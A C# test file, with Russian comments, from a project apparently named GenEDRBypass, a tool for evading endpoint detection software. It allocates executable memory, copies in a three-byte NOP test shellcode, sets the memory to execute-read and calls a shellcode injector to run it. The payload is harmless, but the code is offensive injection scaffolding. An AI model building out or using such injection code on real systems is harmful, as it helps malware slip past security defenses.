using System;
using GenEDRBypass.Core;

namespace GenEDRBypass.Tests
{
    public static class TestShellInjector
    {
        public static void RunTests()
        {
            Console.WriteLine("Тестирование ShellInjector...");

            try
            {
                // Пример выделения памяти и инъекции тестового шеллкода
                byte[] testShellcode = new byte[] { 0x90, 0x90, 0x90 }; // NOP-инструкции для теста
                IntPtr memory = MemoryManager.AllocateExecutableMemory((uint)testShellcode.Length);

                // Копирование тестового шеллкода в выделенную память
                System.Runtime.InteropServices.Marshal.Copy(testShellcode, 0, memory, testShellcode.Length);
                MemoryManager.ProtectMemory(memory, (uint)testShellcode.Length, 0x20);

                // Инъекция и выполнение тестового шеллкода
                ShellInjector.InjectShellcode(memory);
                Console.WriteLine("Инъекция шеллкода прошла успешно.");

                // Освобождаем память
                MemoryManager.FreeMemory(memory, (uint)testShellcode.Length);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Ошибка в ShellInjector: {ex.Message}");
            }
        }
    }
}
